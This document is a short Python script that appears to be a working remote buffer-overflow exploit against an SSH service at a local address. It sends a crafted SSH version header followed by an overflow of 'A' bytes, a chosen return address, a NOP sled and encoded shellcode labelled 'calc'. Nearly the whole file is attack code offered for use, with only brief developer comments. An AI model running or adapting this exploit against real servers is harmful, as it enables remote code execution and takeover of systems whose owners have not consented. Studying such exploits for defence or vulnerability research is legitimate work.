#!/usr/bin/env python
import socket
import sys
import time

def connection():
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.104",22)) #ip port

def fuzzer():
    connection()
    header_key =  "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48" \
                   "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00" \
                   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
    fuzz = 1055 * '\x41'
    eip = '\x53\x93\x37\x7E' #7E 37 93 53 #4 * '\x42'
    nop = 100 * '\x90'
    calc =(
            "\x89\xe6\xdb\xc1\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
            "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
            "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
            "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
            "\x6b\x4c\x4d\x38\x6b\x32\x77\x70\x65\x50\x73\x30\x75\x30\x4c"
            "\x49\x4a\x45\x56\x51\x79\x50\x32\x44\x4e\x6b\x72\x70\x54\x70"
            "\x4e\x6b\x52\x72\x64\x4c\x4e\x6b\x43\x62\x34\x54\x6e\x6b\x42"
            "\x52\x77\x58\x36\x6f\x78\x37\x50\x4a\x66\x46\x70\x31\x49\x6f"
            "\x4c\x6c\x47\x4c\x63\x51\x53\x4c\x35\x52\x54\x6c\x57\x50\x49"
            "\x51\x78\x4f\x54\x4d\x45\x51\x4b\x77\x39\x72\x4c\x32\x62\x72"
            "\x31\x47\x4e\x6b\x76\x32\x34\x50\x4c\x4b\x71\x5a\x55\x6c\x6c"
            "\x4b\x30\x4c\x57\x61\x71\x68\x49\x73\x70\x48\x33\x31\x5a\x71"
            "\x56\x31\x6c\x4b\x30\x59\x77\x50\x56\x61\x5a\x73\x6c\x4b\x51"
            "\x59\x52\x38\x78\x63\x47\x4a\x51\x59\x4e\x6b\x30\x34\x4c\x4b"
            "\x57\x71\x39\x46\x56\x51\x59\x6f\x6e\x4c\x4b\x71\x38\x4f\x74"
            "\x4d\x35\x51\x5a\x67\x35\x68\x49\x70\x32\x55\x49\x66\x64\x43"
            "\x61\x6d\x6a\x58\x37\x4b\x43\x4d\x76\x44\x43\x45\x4d\x34\x62"
            "\x78\x4e\x6b\x50\x58\x35\x74\x33\x31\x39\x43\x45\x36\x6e\x6b"
            "\x54\x4c\x72\x6b\x4c\x4b\x32\x78\x45\x4c\x75\x51\x69\x43\x6e"
            "\x6b\x34\x44\x6c\x4b\x35\x51\x38\x50\x4e\x69\x30\x44\x77\x54"
            "\x77\x54\x31\x4b\x71\x4b\x53\x51\x73\x69\x50\x5a\x30\x51\x39"
            "\x6f\x59\x70\x31\x4f\x53\x6f\x62\x7a\x4e\x6b\x72\x32\x38\x6b"
            "\x4c\x4d\x63\x6d\x70\x6a\x57\x71\x4c\x4d\x4d\x55\x4d\x62\x73"
            "\x30\x77\x70\x57\x70\x46\x30\x31\x78\x65\x61\x6e\x6b\x52\x4f"
            "\x4c\x47\x4b\x4f\x4b\x65\x4d\x6b\x6a\x50\x4d\x65\x6e\x42\x70"
            "\x56\x61\x78\x6c\x66\x6f\x65\x4d\x6d\x6f\x6d\x69\x6f\x59\x45"
            "\x35\x6c\x75\x56\x73\x4c\x57\x7a\x4f\x70\x79\x6b\x4d\x30\x32"
            "\x55\x63\x35\x4d\x6b\x77\x37\x52\x33\x44\x32\x30\x6f\x72\x4a"
            "\x65\x50\x42\x73\x59\x6f\x39\x45\x71\x73\x55\x31\x42\x4c\x70"
            "\x63\x76\x4e\x32\x45\x63\x48\x50\x65\x65\x50\x41\x41"
          )
          #badcod '\x00'
    fuzzer = header_key + fuzz + eip + nop + calc + 22000 * '\x43' + '\r\n'
    s.send(fuzzer)
    s.recv(1204)
    time.sleep(10)
    s.close()

def main():
    fuzzer()
main()